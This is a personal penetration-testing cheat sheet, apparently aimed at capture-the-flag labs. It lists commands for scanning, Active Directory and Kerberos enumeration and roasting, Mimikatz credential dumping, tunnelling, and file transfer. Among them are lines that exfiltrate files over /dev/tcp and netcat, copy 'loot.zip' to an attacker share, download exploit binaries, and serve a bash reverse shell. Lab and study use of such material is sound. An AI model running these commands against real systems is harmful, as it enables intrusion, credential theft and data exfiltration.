---
layout: page
icon: fa-solid fa-list
title: Cheat Sheet
type: cheatsheet
---

The following are the commands I use

## Port scanning

### Nmap

`nmap -sC -sV 10.10.10.10`

`nmap --min-rate 5000 -p- 10.10.10.10`

### Rust Scan

`rustscan -r 0-65535 --ulimit 5000 10.10.10.10 -t 3000 -- -sV -sC`

## Web Scanning

### Directory/files search

`feroxbuster -w /usr/share/seclists/Discovery/Web-Content/big.txt -u http://10.10.10.10/`

`gobuster dir -w /usr/share/seclists/Discovery/Web-Content/big.txt -u http://10.10.10.10/`

`ffuf -c -w /usr/share/seclists/Discovery/Web-Content/big.txt -u http://10.10.10.10/FUZZ`

`wfuzz -c -w /usr/share/seclists/Discovery/Web-Content/big.txt -u http://10.10.10.10/FUZZ`

#### Subdomain

`ffuf -c -w /usr/share/seclists/Discovery/DNS/namelist.txt -u http://target.com -H "Host: FUZZ.target.xyz" --fl 10`

`wfuzz -c -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -u http://target.xyx -H "Host: FUZZ.target.xyz" --hl`

`dig axfr @10.10.10.10 domain.com`

`$ nslookup` `> server 10.10.10.10` `> 127.0.0.1` `> 10.10.10.10`

## TTY SHELL upgrade

`python -c 'import pty; pty.spawn("/bin/bash")'`

`script /dev/null -qc /bin/bash`

`export TERM=xterm`

`stty raw -echo;fg`

## Active Directory/Windows

### SMB

#### List shares

`smbclient -L 10.10.10.10 -N`

`netexec smb 10.10.10.10 -u 'guest' -p '' --shares`

`smbmap -H 10.10.10.10`

### LDAP

`ldapsearch -H 'ldap://target.xyz/' -x -b "dc=target,dc=xyz" -s base '(objectClass=person)' | grep -i "samaccountname"`

### User enumeration

`kerbrute userenum -d [domain] /usr/share/seclists/Usernames/Names/names.txt --dc 10.10.10.10`

`netexec smb target.xyz -u 'guest' -p '' --users`

`impacket-lookupsid guest@[domain] -no-pass`

`impacket-samrdump [domain/username]:[password]@[domain]`

```bash
$ rpcclient -U '' -N 10.10.10.10

rpcclient $> enumdomusers

rpcclient $> lookupnames administrator

rpcclient $> lookupsids S-1-5-21-4078382237-1492182817-2568127209-500
rpcclient $> lookupsids S-1-5-21-4078382237-1492182817-2568127209-501

```

### Kerberos attacks

#### **AS-REP Roasting**

`GetNPUsers.py target.xyz/ -usersfile users.lst -dc-ip 10.10.10.10`

`netexec ldap 10.10.10.10 -u users.lst -p '' --asreproast hashes.txt`

#### **Kerberoasting**

Kerberoasting with credentials:

`GetUserSPNs.py -request [domain]/[username]:[password] -dc-ip 10.10.10.10 -save -outputfile hash.txt`

Kerberoasting without credentials:

`GetUserSPNs.py -no-preauth 'target.xyz/' "username" -usersfile users.lst -dc-host 10.10.10.10`

### Bloodhound

Netexec collection:

`netexec ldap target.xyz -u '[username]' -p '[password]' --bloodhound --collection All`

SharpHound powershell

`Invoke-Bloodhound -CollectionMethod All -Domain [domain] -ZipFileName collection.zip`

`SharpHound.exe --ldapusername 'user' --ldappassword 'password'`

### Mimikatz

`elevate::token`

`privilege::debug`

`sekurlsa::logonpasswords`

## Tunnelling/Port forwarding

### SSH

`sshuttle -r matthew@surveillance.htb -N -x 10.10.11.245`

>The target must have python for `sshuttle` to work

`ssh -L 8080:127.0.0.1:8080 user@target.xyz -Nf`

### chisel

On attacker machine `chisel server --reverse --port 9999`

On target machine `./chisel client 10.10.10.10:9999 R:8080:localhost:8080`

## File transfer

Assume `10.10.10.10` is the source IP and `9.9.9.9` is destination IP.

### Linux

```bash
nc -lvnp 4444 > file #target machine

nc -vn 9.9.9.9 4444 < file #source machine
```

```bash
nc -lvnp 8000 > file #target machine

cat /path/file > /dev/tcp/9.9.9.9/8000 #source machine
```

`scp user@10.10.10.10:/path/to/file ./destination`

### Windows

#### SMB server

Setup an SMB server on the attacker machine with `sudo impacket-smbserver share ./ -smb2support`

`copy \\10.10.10.10\share\exploit.exe C:\Windows\Temp\exploit.exe`

`copy .\loot.zip \\9.9.9.9\share\loot.zip`

#### HTTP

Setup an HTTP server with `sudo python3 -m http.server 80`

`certutil -urlcache -f http://10.10.10.10/file .\file`

`powershell -c (New-Object Net.WebClient).DownloadFile("http://10.10.10.10/file","C:\Windows\Temp\file")`

`powershell -c Invoke-WebRequest "http://10.10.10.10/exploit.exe" -OutFile "exploit.exe"`

`powershell -c wget "http://10.10.10.10/exploit.exe" -OutFile "C:\Windows\Temp\exploit.exe"`

<!-- ```bash
certipy find -u user -p password --dc-ip 10.10.10.10 -stdout -vulnerable
``` -->

## Aliases

```bash
alias www='sudo python3 -m http.server 80'
alias hosts='sudo vim /etc/hosts'
alias tun0cp="ifconfig tun0 | grep 'inet ' | cut -d' ' -f10 | tr -d '\n' | xclip -sel clip"
alias tun0="ifconfig tun0 | grep 'inet ' | cut -d' ' -f10 | tr -d '\n'"

nmapcv() {
    [ ! -d "./scans" ] && mkdir scans
    sudo nmap -sCV -T4 "${@}" | tee scans/nmap
}

nmapall() {
    [ ! -d "./scans" ] && mkdir scans
    sudo nmap --min-rate 1000 -p- -T4 "${@}" | tee scans/nmapall
}

rustall() {
    rustscan -r 0-65535 --ulimit 5000 $1 -t 9000 -- -sV -sC
}

ferobig () { 
    url="$1"; shift; feroxbuster -w /usr/share/wordlists/seclists/Discovery/Web-Content/big.txt -u http://$url "$@" | tee scans/ferobig.txt
}

ferodir () { 
    url="$1"; shift; feroxbuster -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-small.txt -u http://$url "$@" | tee scans/ferodir.txt
}

ferocom () {
    url="$1"; shift; feroxbuster -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt -u http://$url "$@" | tee scans/ferocom.txt
}

ffufnames () {
    url="$1"; shift; ffuf -c -w /usr/share/seclists/Discovery/DNS/namelist.txt -u http://$url -H "Host: FUZZ.$url" "$@"
}

wfuzznames () {
    url="$1"; shift; wfuzz -c -w /usr/share/seclists/Discovery/DNS/namelist.txt -u http://$url -H "Host: FUZZ.$url" "$@"
}

ssx () {
    searchsploit -x "$@"
}

ssm () {
    searchsploit -m "$@"
}

ncbash () {
    echo "bash -i >& /dev/tcp/$(tun0)/9001 0>&1" | nc -lvnp 1234
}

```

## Resources

[0xdf](https://0xdf.gitlab.io/)

[HackTricks](https://book.hacktricks.xyz/)

[Ippsec.rocks](https://ippsec.rocks/)

[PayloadAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings)

[RevShells](https://www.revshells.com/)
